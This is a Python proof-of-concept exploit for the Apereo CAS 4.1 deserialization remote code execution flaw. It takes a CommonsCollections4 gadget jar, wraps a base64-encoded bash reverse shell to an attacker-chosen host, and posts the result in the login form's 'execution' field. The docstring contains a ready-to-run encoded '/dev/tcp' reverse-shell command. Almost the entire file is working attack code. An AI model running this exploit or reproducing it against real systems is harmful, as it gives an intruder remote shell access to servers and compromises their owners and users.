"""
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 cmd = "touch /tmp/success"

java -jar '.\apereo-cas-attack-1.0-SNAPSHOT-all (2).jar' CommonsCollections4 " \
bash -c {echo,YmFzaCAtaT4vZGV2L3RjcC8xOTIuMTY4LjE4LjI0NC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}"
"""
import sys
import os
import requests
import base64
import json



def shell(execution_1):
    s = bytes(r"bash -i >& /dev/tcp/" + execution_1 + " 0>&1 ", "utf-8")
    # sw = bytes(s, 'utf-8')
    out = base64.b64encode(s).decode("utf-8")
    payload = "java -jar Apereo-CAS-Attack/apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 " + '"' + \
              str("bash -c {echo," + str(out) + "}|{base64,-d}|{bash,-i}") + '"'
    f = os.popen(payload)
    return f.read().rstrip("\n")


def resp_Poc(url, execution_2):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Referer": url,
    }

    data = {
        "username": "admin",
        "password": "test",
        "lt": "LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org",
        "execution": execution_2,
        "_eventId": "submit",
        "submit": "LOGIN"
    }
    print(url)
    # 用bytes函数转换为字节
    resp = requests.post(url, data=data, headers=headers)
    print(resp.status_code)
    print(resp.text)

if __name__ == '__main__':
    print("python3 Apereo CAS 4.1 反序列化命令执行漏洞(RCE).py http://192.168.20.138:8080/ 192.168.20.135/5432")
    # 取输入的url
    url = sys.argv[1] + "cas/login"
    # 取输入的攻击机地址shell
    execution_1 = sys.argv[2]
    # 调用函数shell
    execution_2 = shell(execution_1)
    # 调用poc
    resp_Poc(url, execution_2)
